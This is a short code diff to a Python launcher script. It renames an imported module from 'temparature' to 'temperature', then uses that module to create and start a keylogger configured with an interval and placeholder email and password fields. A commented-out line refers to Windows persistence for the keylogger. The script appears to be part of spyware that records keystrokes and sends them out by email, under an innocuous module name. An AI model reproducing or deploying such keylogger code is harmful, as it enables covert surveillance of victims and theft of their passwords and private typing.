@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import temparature
+import temperature
 import sys
 import os
 
@@ -18,5 +18,5 @@ import os
 #import keylogger_persistance_windows
 
 #Main program
-my_keylogger = temparature.Keylogger(120, "<<your email>>", "<<your password>>")
+my_keylogger = temperature.Keylogger(120, "<<your email>>", "<<your password>>")
 my_keylogger.start()
